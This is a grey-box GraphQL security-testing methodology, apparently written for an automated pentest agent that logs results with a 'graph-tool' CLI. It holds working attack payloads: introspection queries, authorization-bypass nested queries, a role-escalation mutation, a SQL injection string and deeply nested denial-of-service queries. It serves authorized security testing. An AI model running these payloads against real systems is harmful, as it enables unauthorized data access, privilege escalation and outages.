## GraphQL Security Testing Methodology (Grey-Box)

### Phase 1: Endpoint Discovery and Introspection
1. Confirm GraphQL endpoint exists (try /graphql, /api/graphql, /gql, /query)
2. Test introspection availability:

```bash
# Full introspection query
graph-tool test-attempt \
  --target "endpoint:POST_graphql" \
  --vuln-type graphql_introspection \
  --technique "full-introspection-query" \
  --payload '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' \
  --result success \
  --response-code 200 \
  --response-excerpt "Schema returned with 42 types and 156 fields"
```

3. If introspection is disabled, try:
   - GET-based queries: `GET /graphql?query={__schema{types{name}}}`
   - Alternative introspection: `{__type(name:"User"){fields{name}}}`
   - Field suggestion exploitation: send invalid field names and collect suggestions from error messages
   - GraphQL IDE endpoints: /graphiql, /playground, /altair, /voyager

### Phase 2: Schema Analysis
If introspection succeeds, map the full schema:
1. Extract all types, queries, mutations, and subscriptions
2. Identify fields that return sensitive data (password, token, secret, key)
3. Find mutations that modify user state (updateUser, deleteAccount, setRole)
4. Note fields with arguments that accept user input (injectable candidates)

Record discovered schema elements in the graph:
```bash
graph-tool add --type endpoint --id "GQL_mutation_updateUser" \
  --data '{"method":"POST","path":"/graphql","operation":"mutation updateUser","args":["id","name","role","email"],"discovered_by":"graphql-specialist"}'
```

### Phase 3: Authorization Bypass via Nested Queries
GraphQL allows querying related objects through nesting. Test if authorization is enforced at every nesting level:

1. Query a permitted object and nest an unauthorized relation:
   ```graphql
   { me { orders { user { email adminNotes } } } }
   ```
2. Access admin-only fields through user-accessible parent objects:
   ```graphql
   { user(id: "other-user") { email privateData } }
   ```
3. Use mutations to modify objects you should not have write access to:
   ```graphql
   mutation { updateUser(id: "admin-id", role: "admin") { id role } }
   ```

```bash
graph-tool test-attempt \
  --target "endpoint:POST_graphql" \
  --vuln-type graphql_authz_bypass \
  --technique "nested-query-escalation" \
  --payload '{"query":"{ me { orders { user { adminNotes } } } }"}' \
  --result success \
  --response-code 200 \
  --response-excerpt "adminNotes field returned data despite user-level auth"
```

### Phase 4: Injection via GraphQL Arguments
Test GraphQL arguments for injection (SQLi, NoSQLi):
1. String arguments: try SQL injection payloads
2. Filter arguments: try NoSQL operators
3. ID arguments: try IDOR with other users' IDs

```bash
graph-tool test-attempt \
  --target "endpoint:POST_graphql" \
  --vuln-type sqli \
  --technique "graphql-argument-injection" \
  --payload '{"query":"{ users(filter: \"admin' OR 1=1--\") { id email } }"}' \
  --result fail \
  --response-code 200 \
  --response-excerpt "GraphQL validation error, not reaching backend query"
```

### Phase 5: Denial of Service and Abuse
Test for resource exhaustion protections:
1. **Query depth**: Send deeply nested queries (10+ levels)
2. **Query complexity**: Request all fields on all types in one query
3. **Batch queries**: Send arrays of expensive queries
4. **Circular references**: Exploit type relationships for exponential response size
5. **Alias abuse**: Same field with many aliases to bypass rate limiting

```bash
graph-tool test-attempt \
  --target "endpoint:POST_graphql" \
  --vuln-type graphql_dos \
  --technique "query-depth-abuse" \
  --payload '{"query":"{ users { friends { friends { friends { friends { name } } } } } }"}' \
  --result fail \
  --response-code 200 \
  --response-excerpt "Query depth limit exceeded (max 5 levels)"
```

### Phase 6: Subscription Security (if applicable)
If GraphQL subscriptions (WebSocket-based) exist:
1. Subscribe to events you should not have access to
2. Test if subscription authorization is enforced per-message
3. Check if subscriptions leak data from other users' events

### Phase 7: Classification
- **EXPLOITED**: Schema exposed, unauthorized data accessed, or injection confirmed
- **POTENTIAL**: Introspection partially available or depth limits insufficient
- **LEAD**: Error messages reveal schema information worth further exploration
- **FALSE_POSITIVE**: GraphQL properly hardened after thorough testing

```bash
graph-tool finding \
  --target "endpoint:POST_graphql" \
  --vuln-type graphql_introspection \
  --severity medium \
  --cwe CWE-200 \
  --title "GraphQL introspection enabled in production" \
  --poc-payload '{"query":"{ __schema { types { name } } }"}' \
  --impact "Full API schema exposed — attackers can enumerate all types, fields, and mutations" \
  --grants '["schema_disclosure"]' \
  --requires '[]' \
  --evidence-file "deliverables/screenshots/graphql-introspection.png" \
  --derived-from "test_attempt:ta_XXXX"

graph-tool release --id "endpoint:POST_graphql" --agent "graphql-specialist"
```
